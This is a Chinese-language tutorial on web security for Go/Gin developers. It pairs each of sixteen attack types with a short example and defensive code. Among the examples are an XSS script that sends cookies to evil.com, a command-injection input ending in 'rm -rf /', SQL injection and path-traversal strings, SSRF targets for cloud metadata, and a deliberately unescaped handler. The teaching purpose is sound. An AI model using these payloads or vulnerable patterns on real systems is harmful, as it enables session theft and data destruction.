# Web 常见安全

面向 Gin / 前后端分离的笔记：每种攻击先讲是什么，再给例子，最后给防护代码。

---

## 目录

1. [XSS（跨站脚本）](#1-xss跨站脚本)
2. [CORS（跨域资源共享）](#2-cors跨域资源共享)
3. [CSRF（跨站请求伪造）](#3-csrf跨站请求伪造)
4. [限流（Rate Limit）](#4-限流rate-limit)
5. [输入验证](#5-输入验证)
6. [SQL 注入](#6-sql-注入)
7. [安全头（Security Headers）](#7-安全头security-headers)
8. [认证与密码安全](#8-认证与密码安全)
9. [越权 / IDOR](#9-越权--idor)
10. [文件上传与路径穿越](#10-文件上传与路径穿越)
11. [命令注入](#11-命令注入)
12. [SSRF（服务端请求伪造）](#12-ssrf服务端请求伪造)
13. [开放重定向](#13-开放重定向)
14. [敏感信息泄露](#14-敏感信息泄露)
15. [会话安全（Session / JWT）](#15-会话安全session--jwt)
16. [点击劫持](#16-点击劫持)

---

## 1. XSS（跨站脚本）

### 是什么

攻击者把**恶意 JavaScript** 塞进页面，别人打开时在受害者浏览器里执行。常见目的：偷 Cookie、伪造操作、挂马。

分两类：

| 类型 | 说明 |
|------|------|
| 存储型 | 脚本存进数据库，每次打开页面都执行 |
| 反射型 | 脚本在 URL/参数里，服务器原样回显到页面 |

### 例子

评论功能如果直接把用户输入拼进 HTML：

```html
<!-- 用户输入 -->
<script>document.location='https://evil.com/steal?c='+document.cookie</script>

<!-- 页面原样输出后，其他用户一打开评论区就中招 -->
<div class="comment">...上面那段脚本...</div>
```

前后端分离时，若前端用 `innerHTML` 渲染用户内容，同样会中招。

### 防护思路

1. **输出编码**：当文本渲染，不要当 HTML 执行  
2. **CSP**：限制能跑哪些脚本  
3. **HttpOnly Cookie**：JS 读不到登录 Cookie  
4. 富文本要做严格白名单过滤  

### 代码（Go / Gin）

```go
package main

import (
	"html"
	"net/http"

	"github.com/gin-gonic/gin"
)

func main() {
	r := gin.Default()

	// ❌ 危险：把用户输入当 HTML 原样返回（仅演示）
	r.GET("/bad", func(c *gin.Context) {
		name := c.Query("name")
		c.Data(http.StatusOK, "text/html; charset=utf-8", []byte("<h1>Hello "+name+"</h1>"))
	})

	// ✅ 转义后再输出
	r.GET("/good", func(c *gin.Context) {
		name := html.EscapeString(c.Query("name"))
		c.Data(http.StatusOK, "text/html; charset=utf-8", []byte("<h1>Hello "+name+"</h1>"))
	})

	// ✅ API 返回 JSON：前端用文本节点渲染，不要 innerHTML
	r.GET("/api/comment", func(c *gin.Context) {
		c.JSON(http.StatusOK, gin.H{
			"content": c.Query("content"), // 前端负责转义显示
		})
	})

	r.Run(":8080")
}
```

前端注意：

```js
// ❌
el.innerHTML = userContent

// ✅
el.textContent = userContent
```

---

## 2. CORS（跨域资源共享）

### 是什么

浏览器的**同源策略**：`https://a.com` 的前端默认不能随便读 `https://b.com` 的响应。  
CORS 是服务器通过响应头**明确允许**哪些源可以跨域访问。

注意：CORS 是**浏览器行为**；用 curl / Postman 不受 CORS 限制。它防的是「恶意网站在用户浏览器里偷你的接口数据」，不是防黑客直接打你的服务器。

### 例子

- 前端：`https://shop.com`
- API：`https://api.shop.com`

浏览器发跨域请求时，若 API 没有返回合适的 `Access-Control-Allow-Origin`，前端 JS 就读不到响应。

恶意站 `evil.com` 想用你的 Cookie 调 `api.shop.com`：没有正确 CORS + 凭证配置时，浏览器会拦住。

### 防护 / 正确配置思路

1. **不要**生产环境写 `Allow-Origin: *` 还带 Cookie  
2. 白名单只放可信前端域名  
3. 需要带 Cookie 时用 `Allow-Credentials: true`，且 Origin 必须是具体域名  

### 代码（Gin）

```go
package main

import (
	"time"

	"github.com/gin-contrib/cors"
	"github.com/gin-gonic/gin"
)

func main() {
	r := gin.Default()

	r.Use(cors.New(cors.Config{
		AllowOrigins:     []string{"https://shop.com", "http://localhost:5173"},
		AllowMethods:     []string{"GET", "POST", "PUT", "DELETE", "OPTIONS"},
		AllowHeaders:     []string{"Origin", "Content-Type", "Authorization"},
		ExposeHeaders:    []string{"Content-Length"},
		AllowCredentials: true, // 允许带 Cookie；此时不能用 *
		MaxAge:           12 * time.Hour,
	}))

	r.GET("/api/me", func(c *gin.Context) {
		c.JSON(200, gin.H{"user": "liam"})
	})

	r.Run(":8080")
}
```

手动理解关键头：

```http
Access-Control-Allow-Origin: https://shop.com
Access-Control-Allow-Credentials: true
Access-Control-Allow-Methods: GET, POST
```

---

## 3. CSRF（跨站请求伪造）

### 是什么

你已登录 `bank.com`，Cookie 还在。你打开恶意页 `evil.com`，它让浏览器**自动带着你的 Cookie** 向 `bank.com` 发「转账」请求。服务器以为是你本人操作。

XSS 是偷你的脚本环境；CSRF 是**借用你的登录态发请求**。

### 例子

```html
<!-- evil.com 上的页面 -->
<img src="https://bank.com/transfer?to=attacker&amount=1000" />
<!-- 或隐藏表单自动 POST -->
```

如果你登录着银行，浏览器可能自动带上 `bank.com` 的 Cookie。

### 防护思路

1. **CSRF Token**：表单/请求头带随机 token，服务器校验（攻击站读不到你的 token）  
2. **SameSite Cookie**：`SameSite=Lax/Strict`，跨站请求不带 Cookie  
3. 重要操作用二次验证  
4. 前后端分离常用：Token 放 Header（如 `Authorization`），不要只靠 Cookie  

### 代码（示意）

```go
package main

import (
	"crypto/rand"
	"encoding/hex"
	"net/http"

	"github.com/gin-gonic/gin"
)

func main() {
	r := gin.Default()

	// 登录后下发 CSRF Token（简化示例，生产用 session 存）
	r.GET("/csrf-token", func(c *gin.Context) {
		token := newToken()
		c.SetCookie("csrf_token", token, 3600, "/", "", false, true) // HttpOnly
		c.JSON(200, gin.H{"csrf_token": token})                     // 前端再放到 Header
	})

	r.POST("/transfer", func(c *gin.Context) {
		cookieToken, _ := c.Cookie("csrf_token")
		headerToken := c.GetHeader("X-CSRF-Token")
		if cookieToken == "" || cookieToken != headerToken {
			c.AbortWithStatusJSON(http.StatusForbidden, gin.H{"error": "csrf invalid"})
			return
		}
		c.JSON(200, gin.H{"message": "transfer ok"})
	})

	r.Run(":8080")
}

func newToken() string {
	b := make([]byte, 16)
	_, _ = rand.Read(b)
	return hex.EncodeToString(b)
}
```

Cookie 建议：

```go
c.SetSameSite(http.SameSiteLaxMode)
c.SetCookie("session", sessionID, 3600, "/", "", true, true) // Secure + HttpOnly
```

---

## 4. 限流（Rate Limit）

### 是什么

限制某 IP / 用户在单位时间内的请求次数，防止刷接口、撞库、拖垮服务。常用**令牌桶**：按固定速度发「令牌」，桶有容量，没令牌就拒绝。

### 例子

登录接口不限流 → 攻击者每秒试几千个密码。  
限成「每 IP 每分钟 5 次」→ 撞库成本大增。

### 代码（Gin + 令牌桶）

```go
package main

import (
	"net/http"
	"sync"

	"github.com/gin-gonic/gin"
	"golang.org/x/time/rate"
)

func RateLimiter() gin.HandlerFunc {
	type client struct {
		limiter *rate.Limiter
	}
	var (
		mu      sync.Mutex
		clients = make(map[string]*client)
	)

	return func(c *gin.Context) {
		ip := c.ClientIP()

		mu.Lock()
		if _, ok := clients[ip]; !ok {
			// 每秒 10 个令牌，桶容量 20（允许短突发）
			clients[ip] = &client{limiter: rate.NewLimiter(10, 20)}
		}
		cl := clients[ip]
		mu.Unlock()

		if !cl.limiter.Allow() {
			c.AbortWithStatusJSON(http.StatusTooManyRequests, gin.H{
				"error": "rate limit exceeded",
			})
			return
		}
		c.Next()
	}
}

func main() {
	r := gin.Default()
	r.Use(RateLimiter())
	r.GET("/api/resource", func(c *gin.Context) {
		c.JSON(200, gin.H{"message": "ok"})
	})
	r.Run()
}
```

说明：`NewLimiter(10, 20)` → 平均 10 次/秒，突发最多 20。生产环境多机部署要用 Redis 做全局限流，并对 IP map 做过期清理。

---

## 5. 输入验证

### 是什么

**永远不要信任客户端数据。** 类型、长度、格式、范围都要在服务端校验，否则会导致注入、逻辑漏洞、存储爆炸等。

### 例子

- `age=-1`、`age=999999`  
- `email` 不是邮箱格式  
- 字符串超长导致日志/DB 异常  
- 枚举字段传了非法值  

### 代码（Gin binding + validator）

```go
package main

import (
	"net/http"

	"github.com/gin-gonic/gin"
)

type RegisterReq struct {
	Email    string `json:"email" binding:"required,email"`
	Password string `json:"password" binding:"required,min=8,max=64"`
	Age      int    `json:"age" binding:"required,gte=1,lte=150"`
	Role     string `json:"role" binding:"omitempty,oneof=user admin"`
}

func main() {
	r := gin.Default()

	r.POST("/register", func(c *gin.Context) {
		var req RegisterReq
		if err := c.ShouldBindJSON(&req); err != nil {
			c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
			return
		}
		// 验证通过后再入库
		c.JSON(http.StatusOK, gin.H{"email": req.Email})
	})

	r.Run(":8080")
}
```

常见 `binding` 规则：`required`、`email`、`min`、`max`、`gte`、`lte`、`oneof`、`url` 等。业务规则（如「用户名不能重复」）仍要在代码/DB 层再查。

---

## 6. SQL 注入

### 是什么

把用户输入直接拼进 SQL，攻击者就能改语句含义，导致拖库、删表、绕过登录。

### 例子

```go
// ❌ 拼接
username := c.Query("user") // 输入: admin' OR '1'='1
sql := "SELECT * FROM users WHERE name = '" + username + "'"
// 变成: SELECT * FROM users WHERE name = 'admin' OR '1'='1'
```

登录可能被直接绕过。

### 防护

1. **参数化查询 / 预编译**（最重要）  
2. ORM 默认参数绑定  
3. 最小权限账号连库  
4. 输入验证作补充，不能替代参数化  

### 代码

```go
package main

import (
	"database/sql"
	"net/http"

	"github.com/gin-gonic/gin"
	_ "github.com/go-sql-driver/mysql"
)

func main() {
	db, _ := sql.Open("mysql", "user:pass@tcp(127.0.0.1:3306)/app")
	r := gin.Default()

	r.GET("/user", func(c *gin.Context) {
		name := c.Query("name")

		// ❌ 危险
		// rows, _ := db.Query("SELECT id,name FROM users WHERE name = '" + name + "'")

		// ✅ 占位符，驱动负责转义/绑定
		rows, err := db.Query("SELECT id, name FROM users WHERE name = ?", name)
		if err != nil {
			c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
			return
		}
		defer rows.Close()

		var id int
		var n string
		if rows.Next() {
			_ = rows.Scan(&id, &n)
			c.JSON(200, gin.H{"id": id, "name": n})
			return
		}
		c.JSON(404, gin.H{"error": "not found"})
	})

	r.Run(":8080")
}
```

GORM 同样要用参数，不要自己拼字符串：

```go
db.Where("name = ?", name).First(&user) // ✅
// db.Where("name = '" + name + "'")   // ❌
```

---

## 7. 安全头（Security Headers）

### 是什么

通过 HTTP 响应头告诉浏览器：**怎么限制页面行为**，降低 XSS、点击劫持、MIME 嗅探、降级到 HTTP 等风险。属于纵深防御，不能替代上面的输入校验和鉴权。

### 常见头

| Header | 作用 |
|--------|------|
| `X-Content-Type-Options: nosniff` | 防止 MIME 嗅探。避免把伪装成图片的 JS 当脚本执行。 |
| `X-Frame-Options: DENY` | 禁止被嵌入 iframe，防点击劫持。 |
| `Content-Security-Policy` | 限制脚本/样式/图片等来源，防 XSS 的重要手段。 |
| `X-XSS-Protection: 1; mode=block` | 旧浏览器 XSS 过滤器；现代浏览器已基本弃用，可作兼容。 |
| `Strict-Transport-Security` | 强制后续只用 HTTPS，防降级和中间人。 |
| `Referrer-Policy: strict-origin` | 控制 Referer 泄露多少信息。 |
| `Permissions-Policy` | 限制摄像头、麦克风、地理位置等能力。 |

### 例子

没有 `X-Frame-Options` / CSP 的 `frame-ancestors` 时，钓鱼站可以用透明 iframe 盖在你的「删除账户」按钮上，骗你点。

### 代码（Gin 中间件）

```go
package main

import (
	"net/http"

	"github.com/gin-gonic/gin"
)

func main() {
	r := gin.Default()
	expectedHost := "localhost:8080"

	r.Use(func(c *gin.Context) {
		// 简单防 Host 头伪造（生产按实际域名配置）
		if c.Request.Host != expectedHost {
			c.AbortWithStatusJSON(http.StatusBadRequest, gin.H{"error": "Invalid host header"})
			return
		}
		c.Header("X-Frame-Options", "DENY")
		c.Header("Content-Security-Policy", "default-src 'self'")
		c.Header("X-XSS-Protection", "1; mode=block")
		c.Header("Strict-Transport-Security", "max-age=31536000; includeSubDomains")
		c.Header("Referrer-Policy", "strict-origin")
		c.Header("X-Content-Type-Options", "nosniff")
		c.Header("Permissions-Policy", "geolocation=(), microphone=(), camera=()")
		c.Next()
	})

	r.GET("/ping", func(c *gin.Context) {
		c.JSON(200, gin.H{"message": "pong"})
	})

	r.Run()
}
```

CSP 在纯 API 服务上可以很严；若还要服务端渲染页面，需按前端资源域名仔细配置，过严会导致页面脚本/样式加载失败。

---

## 8. 认证与密码安全

### 是什么

用户登录靠「你是谁」。密码不能明文存；传输要用 HTTPS；登录接口要防暴力破解（限流 + 锁定）。

### 例子

- 数据库里直接存 `password = "123456"` → 拖库后所有人密码暴露  
- 用 MD5 无盐哈希 → 彩虹表秒破  

### 防护

1. **bcrypt / argon2** 哈希存储（自带盐）  
2. HTTPS 传输  
3. 登录限流、验证码  
4. 不要在日志里打密码  

### 代码

```go
package main

import (
	"net/http"

	"github.com/gin-gonic/gin"
	"golang.org/x/crypto/bcrypt"
)

func hashPassword(plain string) (string, error) {
	b, err := bcrypt.GenerateFromPassword([]byte(plain), bcrypt.DefaultCost)
	return string(b), err
}

func checkPassword(hash, plain string) bool {
	return bcrypt.CompareHashAndPassword([]byte(hash), []byte(plain)) == nil
}

func main() {
	r := gin.Default()

	// 注册时存 hash，不存明文
	r.POST("/register", func(c *gin.Context) {
		var req struct {
			Password string `json:"password" binding:"required,min=8"`
		}
		if err := c.ShouldBindJSON(&req); err != nil {
			c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
			return
		}
		hash, err := hashPassword(req.Password)
		if err != nil {
			c.JSON(500, gin.H{"error": "hash failed"})
			return
		}
		// 把 hash 存 DB
		c.JSON(200, gin.H{"password_hash": hash})
	})

	r.POST("/login", func(c *gin.Context) {
		var req struct {
			Password string `json:"password"`
		}
		_ = c.ShouldBindJSON(&req)
		storedHash := "$2a$10$..." // 从 DB 取出
		if !checkPassword(storedHash, req.Password) {
			c.JSON(http.StatusUnauthorized, gin.H{"error": "invalid credentials"})
			return
		}
		c.JSON(200, gin.H{"message": "ok"})
	})

	r.Run()
}
```

---

## 9. 越权 / IDOR

### 是什么

**Insecure Direct Object Reference**：只校验「登录了」，没校验「能不能操作这个资源」。改个 ID 就能看别人的订单、删别人的数据。

### 例子

```http
GET /api/orders/1001   ← 你的订单
GET /api/orders/1002   ← 改成别人的 ID，接口照样返回
```

### 防护

每个资源访问都要验证：`当前用户 == 资源所有者`，或有管理员角色。不要只信 URL 里的 id。

### 代码

```go
r.GET("/orders/:id", AuthRequired(), func(c *gin.Context) {
	uid := c.GetInt("user_id") // 登录中间件写入
	oid := c.Param("id")

	var order Order
	if err := db.First(&order, oid).Error; err != nil {
		c.JSON(404, gin.H{"error": "not found"})
		return
	}
	// ✅ 所有权校验
	if order.UserID != uid {
		c.JSON(http.StatusForbidden, gin.H{"error": "forbidden"})
		return
	}
	c.JSON(200, order)
})
```

---

## 10. 文件上传与路径穿越

### 是什么

1. **恶意文件**：上传 `.php` / `.jsp` / 伪装成图片的脚本  
2. **路径穿越**：文件名带 `../`，写出到任意目录  

### 例子

```text
文件名: ../../etc/passwd
保存路径若直接拼接 → 覆盖系统文件

文件名: shell.jpg.php
扩展名校验不严 → 当脚本执行
```

### 防护

1. 白名单扩展名 + 校验 Content-Type / 魔数  
2. **自己生成存储文件名**，不用用户原始名当路径  
3. 存到非 Web 可执行目录，下载用 `c.File` 受控输出  
4. 限制大小  

### 代码

```go
package main

import (
	"net/http"
	"os"
	"path/filepath"
	"strings"

	"github.com/gin-gonic/gin"
	"github.com/google/uuid"
)

var allowExt = map[string]bool{".jpg": true, ".png": true, ".pdf": true}

func main() {
	r := gin.Default()
	_ = os.MkdirAll("./uploads", 0755)

	r.POST("/upload", func(c *gin.Context) {
		file, err := c.FormFile("file")
		if err != nil {
			c.JSON(400, gin.H{"error": err.Error()})
			return
		}
		if file.Size > 5<<20 { // 5MB
			c.JSON(400, gin.H{"error": "file too large"})
			return
		}

		ext := strings.ToLower(filepath.Ext(file.Filename))
		if !allowExt[ext] {
			c.JSON(400, gin.H{"error": "ext not allowed"})
			return
		}

		// ❌ dst := filepath.Join("uploads", file.Filename)
		// ✅ 忽略用户文件名中的路径，自行命名
		dst := filepath.Join("uploads", uuid.New().String()+ext)
		if err := c.SaveUploadedFile(file, dst); err != nil {
			c.JSON(500, gin.H{"error": err.Error()})
			return
		}
		c.JSON(200, gin.H{"path": dst})
	})

	r.Run()
}
```

路径穿越单独防一下：

```go
func safeJoin(base, name string) (string, error) {
	clean := filepath.Clean("/" + name) // 去掉 ..
	full := filepath.Join(base, clean)
	if !strings.HasPrefix(full, filepath.Clean(base)+string(os.PathSeparator)) {
		return "", errors.New("path traversal")
	}
	return full, nil
}
```

---

## 11. 命令注入

### 是什么

把用户输入拼进 shell 命令，攻击者可执行任意系统命令。

### 例子

```go
host := c.Query("host") // 输入: 127.0.0.1; rm -rf /
exec.Command("sh", "-c", "ping "+host).Run()
```

### 防护

1. 尽量不调 shell；要用就 **参数数组**，不要 `sh -c` 拼接  
2. 对输入做白名单（如只允许 IP 格式）  

### 代码

```go
import (
	"net"
	"os/exec"
)

r.GET("/ping", func(c *gin.Context) {
	host := c.Query("host")
	if net.ParseIP(host) == nil { // 白名单：必须是合法 IP
		c.JSON(400, gin.H{"error": "invalid ip"})
		return
	}
	// ✅ 参数分离，不经过 shell 拼接
	cmd := exec.Command("ping", "-n", "1", host) // Windows；Linux 用 -c
	out, err := cmd.CombinedOutput()
	if err != nil {
		c.JSON(500, gin.H{"error": err.Error()})
		return
	}
	c.Data(200, "text/plain", out)
})
```

---

## 12. SSRF（服务端请求伪造）

### 是什么

服务器按用户给的 URL 去发请求。攻击者让你的服务器访问**内网**（`127.0.0.1`、`169.254.169.254` 云元数据）或扫描内网。

### 例子

```http
POST /fetch
{"url": "http://127.0.0.1:6379/"}
{"url": "http://169.254.169.254/latest/meta-data/"}
```

### 防护

1. URL 协议白名单（只 https）  
2. 解析后禁止私有 IP / localhost  
3. 不要把响应原样透传敏感内容  

### 代码（示意）

```go
func isPrivateIP(host string) bool {
	ip := net.ParseIP(host)
	if ip == nil {
		return true
	}
	private := []net.IPNet{
		mustCIDR("10.0.0.0/8"),
		mustCIDR("172.16.0.0/12"),
		mustCIDR("192.168.0.0/16"),
		mustCIDR("127.0.0.0/8"),
		mustCIDR("169.254.0.0/16"),
	}
	for _, n := range private {
		if n.Contains(ip) {
			return true
		}
	}
	return false
}

r.POST("/fetch", func(c *gin.Context) {
	var req struct{ URL string `json:"url" binding:"required,url"` }
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(400, gin.H{"error": err.Error()})
		return
	}
	u, _ := url.Parse(req.URL)
	if u.Scheme != "https" {
		c.JSON(400, gin.H{"error": "https only"})
		return
	}
	host := u.Hostname()
	ips, _ := net.LookupIP(host)
	for _, ip := range ips {
		if isPrivateIP(ip.String()) {
			c.JSON(400, gin.H{"error": "private ip forbidden"})
			return
		}
	}
	// 再 http.Get，并设超时
})
```

---

## 13. 开放重定向

### 是什么

登录后跳转地址来自用户参数，未校验就被重定向到钓鱼站。

### 例子

```text
https://shop.com/login?next=https://evil.com/fake-login
登录成功后跳到 evil.com，用户以为还在官方站
```

### 防护

只允许相对路径，或白名单域名。

### 代码

```go
r.GET("/login/callback", func(c *gin.Context) {
	next := c.Query("next")
	if next == "" {
		next = "/"
	}
	// ✅ 只允许站内相对路径
	if !strings.HasPrefix(next, "/") || strings.HasPrefix(next, "//") {
		next = "/"
	}
	c.Redirect(http.StatusFound, next)
})
```

---

## 14. 敏感信息泄露

### 是什么

错误信息、调试页、源码、`.env`、备份文件、详细堆栈暴露给外网，帮助攻击者下一步利用。

### 例子

- 生产环境返回完整 SQL 报错、文件路径  
- `GET /.git/config` 能下载  
- 接口返回了用户密码哈希、内部 IP  

### 防护

1. 生产关闭 debug，对外只返回笼统错误  
2. 静态资源别暴露 `.git`、`.env`  
3. 响应体最小化，敏感字段不返回  

### 代码

```go
gin.SetMode(gin.ReleaseMode)

r.GET("/user/:id", func(c *gin.Context) {
	user, err := findUser(c.Param("id"))
	if err != nil {
		log.Printf("findUser err: %v", err) // 详细日志只写服务端
		c.JSON(500, gin.H{"error": "internal error"}) // ✅ 对外笼统
		return
	}
	c.JSON(200, gin.H{
		"id":    user.ID,
		"name":  user.Name,
		// ❌ "password_hash": user.Hash,
	})
})
```

---

## 15. 会话安全（Session / JWT）

### 是什么

登录态怎么保存：Session（服务端存）或 JWT（客户端带 Token）。两者都要防盗用、固定、泄露。

### 例子

- Cookie 没有 `HttpOnly` → XSS 偷 Session  
- JWT 存在 localStorage → XSS 一偷就完  
- JWT 密钥太弱、不过期  

### 防护

| | Session Cookie | JWT |
|---|----------------|-----|
| 建议 | `HttpOnly` + `Secure` + `SameSite` | 短过期 + 刷新令牌；密钥够强 |
| 存储 | 服务端 Session Store | 尽量内存/安全存储，注意 XSS |
| 注销 | 删服务端 Session | 黑名单或短过期 |

### 代码（Cookie Session 要点）

```go
c.SetSameSite(http.SameSiteLaxMode)
c.SetCookie("session_id", sid, 3600, "/", "", true, true)
// Secure=true（仅 HTTPS）, HttpOnly=true（JS 不可读）
```

JWT 校验示意：

```go
token, err := jwt.Parse(tokenStr, func(t *jwt.Token) (any, error) {
	if t.Method.Alg() != "HS256" {
		return nil, fmt.Errorf("unexpected alg")
	}
	return []byte(os.Getenv("JWT_SECRET")), nil
})
```

---

## 16. 点击劫持

### 是什么

攻击页用透明 iframe 盖住你的站点，诱骗用户点击「删除账户」等按钮。本质是 UI 层欺骗，常靠安全头缓解。

### 例子

```html
<!-- evil.com -->
<iframe src="https://shop.com/settings" style="opacity:0.01"></iframe>
<button style="position:absolute">点我领奖</button>
```

用户以为点领奖，实际点的是 iframe 里的危险按钮。

### 防护

```go
c.Header("X-Frame-Options", "DENY")
// 或 CSP
c.Header("Content-Security-Policy", "frame-ancestors 'none'")
```

---

## 对照小结

| 主题 | 核心一句话 | 关键手段 |
|------|------------|----------|
| XSS | 别让用户输入变成可执行脚本 | 转义 / CSP / HttpOnly |
| CORS | 浏览器跨域要服务器点头 | Origin 白名单，慎用 `*` |
| CSRF | 别让别的网站借你的登录态办事 | CSRF Token / SameSite |
| 限流 | 别让人把接口打爆或狂撞密码 | 令牌桶 / Redis 限流 |
| 输入验证 | 永远不信任客户端 | binding + 业务校验 |
| SQL 注入 | 别把输入拼进 SQL | `?` 占位符 / ORM |
| 安全头 | 给浏览器加行为限制 | CSP、HSTS、Frame Options 等 |
| 密码安全 | 密码只存强哈希 | bcrypt / argon2 + HTTPS |
| 越权 IDOR | 登录了 ≠ 能操作任意资源 | 所有权 / 角色校验 |
| 文件上传 | 文件名和类型都不可信 | 白名单 + 自命名 + 隔离目录 |
| 命令注入 | 别把输入拼进 shell | 参数数组 + 白名单 |
| SSRF | 别让服务器替你扫内网 | URL/IP 白名单 |
| 开放重定向 | 跳转地址不可信 | 仅相对路径 / 域名白名单 |
| 信息泄露 | 对外少说话 | ReleaseMode + 笼统错误 |
| Session/JWT | 登录态防盗防滥用 | HttpOnly/Secure/短过期 |
| 点击劫持 | 防被嵌进别人页面点按钮 | `X-Frame-Options` / CSP |

**建议优先顺序：**  
输入验证 + 参数化 SQL → 密码哈希与鉴权 → 越权校验 → 上传/命令/SSRF → CSRF/Cookie → 限流 → XSS/CSP → 安全头与 CORS。
